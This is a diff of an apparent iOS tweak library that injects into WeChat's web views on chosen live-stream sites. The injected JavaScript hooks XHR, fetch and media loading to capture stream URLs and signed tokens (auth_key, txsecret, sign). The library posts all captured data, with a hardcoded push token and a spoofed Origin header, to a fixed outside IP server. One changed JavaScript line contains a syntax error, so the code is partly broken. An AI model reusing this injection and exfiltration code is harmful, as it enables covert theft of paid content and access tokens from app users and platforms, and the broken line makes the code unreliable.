@@ -1,7 +1,6 @@
 //
-// ALIUltraSafe_WeChat.m
-// 超稳不崩版：无 swizzle、无弹窗，只做 JS 注入 + AV AccessLog 监听 + 兜底上报
-// 适合微信等敏感容器，先求稳再逐步加料。
+// ALIInjectOnEnter_Popup.m
+// 进入目标 H5 才注入；注入成功&抓到URL都弹窗+复制；带安全重试避免 WeChat 闪退。
 // 编译：-framework WebKit -framework AVFoundation -framework UIKit -framework Foundation
 //
 
@@ -11,20 +10,23 @@
 #import <AVFoundation/AVFoundation.h>
 #import <objc/runtime.h>
 
-#pragma mark - 配置 & 开关
+#pragma mark - 配置
 
 static NSString * const kPushHost  = @"http://139.155.57.242:8088";
 static NSString * const kPushToken = @"@Yy166431";
 static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/api/push_form", @"/push", @"/push_raw"]; }
 
-static const NSTimeInterval kScanInterval     = 2.0;   // 扫描窗口间隔（放慢，求稳）
-static const NSTimeInterval kInjectDelay      = 0.8;   // 注入前延时
-static const NSTimeInterval kDedupeWindow     = 60.0;  // 去重窗口
-static const double        kProgressThreshold = 0.6;   // 注入门限
-static const BOOL          kForceUploadAll    = YES;   // 兜底：所有 URL 都上传
-static const BOOL          kAutoCopyOnHit     = YES;   // 命中时静默复制到剪贴板（不弹窗）
-static const BOOL          kShowPopupDisabled = NO;    // 彻底关闭所有弹窗（安全）
+static const NSTimeInterval kScanInterval     = 1.0;   // 扫描 WK 窗口
+static const NSTimeInterval kInjectDelay      = 0.50;  // 命中域名后再延迟注入
+static const NSTimeInterval kDedupeWindow     = 60.0;  // URL 去重
+static const double        kProgressThreshold = 0.55;  // 文档就绪门限
 
+static const BOOL kPopupOnInject = YES;   // 注入成功弹窗
+static const BOOL kPopupOnHit    = YES;   // 抓到 URL 弹窗
+static const BOOL kCopyOnHit     = YES;   // 抓到/注入时复制
+static const BOOL kForceUploadAll= YES;   // 兜底上报所有 URL
+
+// 仅这些域名才注入
 static NSArray<NSString*> *TargetHosts(void){
     return @[@"ukmdg.cn", @"vzuk.ukmdg.cn", @"wehfws.vzuk.ukmdg.cn", @"vzan.com", @"weizan.com"];
 }
@@ -33,32 +35,79 @@ static NSArray<NSString*> *TargetHosts(void){
 #define DEBUG_LOG 0
 #endif
 #if DEBUG_LOG
-#define LOG(fmt, ...) NSLog((@"[ALI:UltraSafe] " fmt), ##__VA_ARGS__)
+#define LOG(fmt, ...) NSLog((@"[ALI-INJ] " fmt), ##__VA_ARGS__)
 #else
 #define LOG(...)
 #endif
 
-#pragma mark - 前向声明
+#pragma mark - 前置声明
 
-static void postText(NSString *text);
-static NSString *jsonStringify(NSDictionary *obj);
-static void handleRawEvent(NSDictionary *evt);
-static void handleCapturedURL(NSString *url, NSString *from);
 static void installAVObservers(void);
 static void scan_loop(void);
+static void handleRawEvent(NSDictionary *evt);
+static void handleCapturedURL(NSString *url, NSString *from);
+static void postText(NSString *text);
+static NSString *jsonStringify(NSDictionary *obj);
 
 #pragma mark - 全局
 
 static dispatch_queue_t gq;
 static NSMutableDictionary<NSString*, NSDate*> *g_seen;
-static id g_accessLogToken1 = nil;
-static id g_accessLogToken2 = nil;
+static id g_accessLogToken1 = nil, g_accessLogToken2 = nil;
 
-#pragma mark - 小工具
+#pragma mark - 小工具（安全弹窗）
 
 static inline void on_main(void(^blk)(void)){
     if (!blk) return;
     if (NSThread.isMainThread) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
+}
+
+static UIWindow *keyWin(void){
+    UIWindow *win = nil;
+    if (@available(iOS 13.0,*)) {
+        for (UIScene *s in UIApplication.sharedApplication.connectedScenes) {
+            if (![s isKindOfClass:[UIWindowScene class]]) continue;
+            UIWindowScene *sc = (UIWindowScene*)s;
+            if (sc.activationState==UISceneActivationStateForegroundActive) {
+                for (UIWindow *w in sc.windows) if (w.isKeyWindow){ win=w; break; }
+                if (win) break;
+            }
+        }
+    }
+    if (!win) win = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
+    return win;
+}
+
+// 可重试的安全弹窗（避免 WeChat 转场阶段崩溃）
+static void popup_safe(NSString *title, NSString *msg, NSString *copyText){
+    if (!msg) return;
+    on_main(^{
+        __block int tries = 0;
+        void (^tryPresent)(void) = ^{
+            @try{
+                UIWindow *w = keyWin(); if (!w){ goto RETRY; }
+                UIViewController *vc = w.rootViewController; if (!vc){ goto RETRY; }
+                // 如果还有别的控制器在 present，等它结束（避免 "presenting view controllers on detached view controllers" 崩溃）
+                while (vc.presentedViewController) vc = vc.presentedViewController;
+                if (!vc.view.window){ goto RETRY; }
+
+                UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
+                if (copyText.length){
+                    [ac addAction:[UIAlertAction actionWithTitle:@"复制" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a){
+                        UIPasteboard.generalPasteboard.string = copyText;
+                    }]];
+                }
+                [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
+                [vc presentViewController:ac animated:YES completion:nil];
+                return;
+            }@catch(__unused NSException *e){}
+        RETRY:
+            if (tries++ < 6){ // 最多重试 ~1.8s
+                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.3 * NSEC_PER_SEC)), dispatch_get_main_queue(), tryPresent);
+            }
+        };
+        tryPresent();
+    });
 }
 
 static BOOL looksLikeStream(NSString *u){
@@ -96,7 +145,7 @@ static void _ali_post_chain(NSArray<NSString*> *paths, NSUInteger idx, NSData *b
     [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
     req.HTTPBody = body;
     [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
-        NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
+        NSInteger sc = [r isKindOfClass:[NSHTTPURLResponse class]] ? ((NSHTTPURLResponse*)r).statusCode : -1;
         if (e || sc < 200 || sc >= 300) _ali_post_chain(paths, idx+1, body);
     }] resume];
 }
@@ -110,11 +159,10 @@ static NSString *jsonStringify(NSDictionary *obj){
     return d ? [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] : nil;
 }
 
-#pragma mark - 统一事件处理
+#pragma mark - 统一事件处理（JS / 原生）
 
 static void handleRawEvent(NSDictionary *evt){
-    NSString *js = jsonStringify(evt);
-    if (js) postText(js);
+    NSString *js = jsonStringify(evt); if (js) postText(js);
 
     NSString *u = evt[@"url"];
     if (!u) return;
@@ -122,13 +170,15 @@ static void handleRawEvent(NSDictionary *evt){
     BOOL like = looksLikeStream(u);
     if (kForceUploadAll || like){
         if (!dedupe_skip(u)){
-            if (kAutoCopyOnHit) UIPasteboard.generalPasteboard.string = u;
+            if (kPopupOnHit){ if (kCopyOnHit) UIPasteboard.generalPasteboard.string = u;
+                popup_safe(@"抓到 URL", [NSString stringWithFormat:@"%@\n%@", evt[@"from"]?:evt[@"type"]?:@"inpage", u], u);
+            } else if (kCopyOnHit) { UIPasteboard.generalPasteboard.string = u; }
             NSDictionary *hit = @{@"type": @"JS_HIT",
                                   @"from": evt[@"from"] ?: evt[@"type"] ?: @"inpage",
                                   @"url": u,
                                   @"page": evt[@"page"] ?: @"",
                                   @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
-            NSString *s = jsonStringify(hit); if (s) postText(s);
+            NSString *s2 = jsonStringify(hit); if (s2) postText(s2);
         }
     }
 }
@@ -136,26 +186,31 @@ static void handleRawEvent(NSDictionary *evt){
 static void handleCapturedURL(NSString *url, NSString *from){
     if (!url) return;
     if (dedupe_skip(url)) return;
+
     NSDictionary *evt = @{@"type": @"NATIVE_HIT",
                           @"from": from ?: @"native",
                           @"url": url,
                           @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
     NSString *s = jsonStringify(evt); if (s) postText(s);
-    if (kAutoCopyOnHit && looksLikeStream(url)) UIPasteboard.generalPasteboard.string = url;
+
+    if (looksLikeStream(url)){
+        if (kPopupOnHit){ if (kCopyOnHit) UIPasteboard.generalPasteboard.string = url;
+            popup_safe(@"捕获播放/请求 URL", [NSString stringWithFormat:@"%@\n%@", from?:@"native", url], url);
+        } else if (kCopyOnHit) { UIPasteboard.generalPasteboard.string = url; }
+    }
 }
 
-#pragma mark - inpage JS
+#pragma mark - inpage JS（与前版一致）
 
 static NSString *inpageJS(void){
     return @
     "(function(){try{"
       "function send(t,data){try{var p=data||{};p.type=t;p.ts=Date.now();p.page=location.href;p.ua=navigator.userAgent;"
-        "if(window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers.__ALI_SNIF__){window.webkit.messageHandlers.__ALI_SNIF__.postMessage(p);}else{window.__ALI_SNIF_LAST__=p;}}catch(e){}}"
-      "function looks(u){if(!u) return false; u=(''+u).toLowerCase();"
-        "if(u.indexOf('.m3u8')!=-1||u.indexOf('.flv')!=-1||u.indexOf('.mp4')!=-1||u.indexOf('.ts')!=-1) return true;"
-        "if(u.indexOf('auth_key=')!=-1||u.indexOf('txsecret')!=-1||u.indexOf('txkey')!=-1||u.indexOf('token=')!=-1||u.indexOf('sign=')!=-1||u.indexOf('auth=')!=-1) return true;"
-        "if(u.indexOf('phonelive')!=-1||u.indexOf('vzan')!=-1||u.indexOf('weizan')!=-1||u.indexOf('ukmdg')!=-1||u.indexOf('vzuk')!=-1||u.indexOf('wehfws')!=-1) return true;"
-        "return false;}"
+        "if(window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers.__ALI_SNIF__){window.webkit.messageHandlers.__ALI_SNIF__.postMessage(p);} }catch(e){}}"
+      "function looks(u){if(!u)return false;u=(''+u).toLowerCase();"
+        "if(u.indexOf('.m3u8')!=-1||u.indexOf('.flv')!=-1||u.indexOf('.mp4')!=-1||u.indexOf('.ts')!=-1)return true;"
+        "if(u.indexOf('auth_key=')!=-1||u.indexOf('txsecret')!=-1||u.indexOf('txkey')!=-1||u.indexOf('token=')!=-1||u.indexOf('sign=')!=-1||u.indexOf('auth=')!=-1)return true;"
+        "if(u.indexOf('phonelive')!=-1||u.indexOf('vzan')!=-1||u.indexOf('weizan')!=-1||u.indexOf('ukmdg')!=-1||u.indexOf('vzuk')!=-1||u.indexOf('wehfws')!=-1)return true;return false;}"
       "send('INJECT_OK',{});"
       "(function(){var O=XMLHttpRequest.prototype.open,S=XMLHttpRequest.prototype.send;if(XMLHttpRequest.prototype.__ali_patched__)return;XMLHttpRequest.prototype.__ali_patched__=true;"
         "XMLHttpRequest.prototype.open=function(m,u){try{this.__ali_u=u?u.toString():'';this.__ali_m=(m||'').toString();}catch(e){}return O.apply(this,arguments)};"
@@ -166,10 +221,10 @@ static NSString *inpageJS(void){
           "this.addEventListener&&this.addEventListener('load',onload);}catch(e){}return S.apply(this,arguments)};"
       "})();"
       "(function(){if(!window.fetch||window.fetch.__ali_patched__)return;var F=window.fetch;window.fetch.__ali_patched__=true;"
-        "window.fetch=function(i,init){try{var u=(typeof i==='string')?i:(i&&i.url)||'';var m=(init&&init.method)||'GET';if(u){send('FETCH_REQ',{from:'fetch',url:u,method:m});}"
+        "window.fetch=function(i,init){try{var u=(typeof i==='string')?i:(i&&i.url)||'';var m=(init&&init.method)||'GET';if(u)send('FETCH_REQ',{from:'fetch',url:u,method:m});"
           "return F.apply(this,arguments).then(function(r){try{var ct=r.headers&&r.headers.get&&r.headers.get('content-type')||'';var st=r.status||0;var c=r.clone&&r.clone();"
             "if(c&&c.text){c.text().then(function(t){var sample=null;if(t&&t.indexOf('#EXTM3U')!=-1){sample=t.slice(0,256);if(!ct)ct='application/vnd.apple.mpegurl';}"
-              "send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct,sample:sample});}).catch(function(){send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});});}"
+              "send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct,sample:sample});}).catch(function(){send('FETCH_RSP',{from:'fetch',url=u,method:m,status:st,ctype:ct});});}"
             "else{send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});}if(looks(u))send('HIT',{from:'fetch',url:u});}catch(e){}return r;});}"
         "catch(e){return F.apply(this,arguments)}})();"
       "(function(){if(!('PerformanceObserver'in window)||window.__ali_perf__)return;window.__ali_perf__=true;"
@@ -187,14 +242,14 @@ static NSString *inpageJS(void){
     "}catch(e){}})();";
 }
 
-#pragma mark - WK 注入（无弹窗、安全门控）
+#pragma mark - WK 注入（只在命中域名时注入 + 弹窗提示）
 
 @interface ALIMessageHandler : NSObject <WKScriptMessageHandler>
 @end
 @implementation ALIMessageHandler
 - (void)userContentController:(WKUserContentController *)userContentController
       didReceiveScriptMessage:(WKScriptMessage *)message {
-    if (![message.body isKindOfClass:NSDictionary.class]) return;
+    if (![message.body isKindOfClass:[NSDictionary class]]) return;
     handleRawEvent((NSDictionary *)message.body);
 }
 @end
@@ -235,7 +290,7 @@ static void try_inject_when_ready(WKWebView *wv){
 
     [wv evaluateJavaScript:@"document.readyState" completionHandler:^(id val, NSError *err){
         if (err) return;
-        NSString *rs = [val isKindOfClass:NSString.class] ? (NSString*)val : @"";
+        NSString *rs = [val isKindOfClass:[NSString class]] ? val : @"";
         if (![rs isEqualToString:@"complete"] && ![rs isEqualToString:@"interactive"]) return;
 
         NSNumber *flag = objc_getAssociatedObject(wv, kInjectedKey);
@@ -256,7 +311,12 @@ static void try_inject_when_ready(WKWebView *wv){
 
             [wv evaluateJavaScript:inpageJS() completionHandler:nil];
 
-            // 上报注入成功（无弹窗）
+            // 注入成功：一定弹窗提示
+            if (kPopupOnInject){
+                NSString *p = wv.URL.absoluteString ?: @"";
+                if (kCopyOnHit) UIPasteboard.generalPasteboard.string = p;
+                popup_safe(@"JS 注入成功", [NSString stringWithFormat:@"已进入：%@\n开始采集（XHR/fetch/资源/Media）", wv.URL.host ?: @"(null)"], nil);
+            }
             NSDictionary *evt = @{@"type": @"NATIVE_INJECT_OK",
                                   @"app": @"WeChat",
                                   @"page": (wv.URL.absoluteString ?: @""),
@@ -316,7 +376,7 @@ static void scan_loop(void){
     dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kScanInterval*NSEC_PER_SEC)), gq, ^{ scan_loop(); });
 }
 
-#pragma mark - AV AccessLog 监听（安全，无 swizzle）
+#pragma mark - AV AccessLog（不 swizzle）
 
 static void installAVObservers(void){
     @try{
@@ -328,8 +388,7 @@ static void installAVObservers(void){
                     if ([item respondsToSelector:@selector(accessLog)]) {
                         id log = [item accessLog];
                         if (log && [log respondsToSelector:@selector(events)]) {
-                            NSArray *events = [log events];
-                            id ev = events.lastObject;
+                            id ev = [log events].lastObject;
                             SEL sel = NSSelectorFromString(@"URI");
 #pragma clang diagnostic push
 #pragma clang diagnostic ignored "-Warc-performSelector-leaks"
@@ -371,15 +430,11 @@ static void installAVObservers(void){
 #pragma mark - 入口
 
 __attribute__((constructor))
-static void ALIUltraSafe_WeChat_Init(void){
-    if (!gq)    gq    = dispatch_queue_create("com.ali.ultrasafe.wechat", DISPATCH_QUEUE_SERIAL);
+static void ALIInjectOnEnter_Popup_Init(void){
+    if (!gq)    gq    = dispatch_queue_create("com.ali.inject.onenter.popup", DISPATCH_QUEUE_SERIAL);
     if (!g_seen) g_seen = [NSMutableDictionary dictionary];
-
-    // 启动：仅扫描 WK + 安装 AccessLog 监听（无弹窗、无 swizzle）
     scan_loop();
     installAVObservers();
-
-    // 上报 Ready
     NSDictionary *evt = @{@"type": @"LOADER_INIT", @"app": @"WeChat",
                           @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
     NSString *s = jsonStringify(evt); if (s) postText(s);
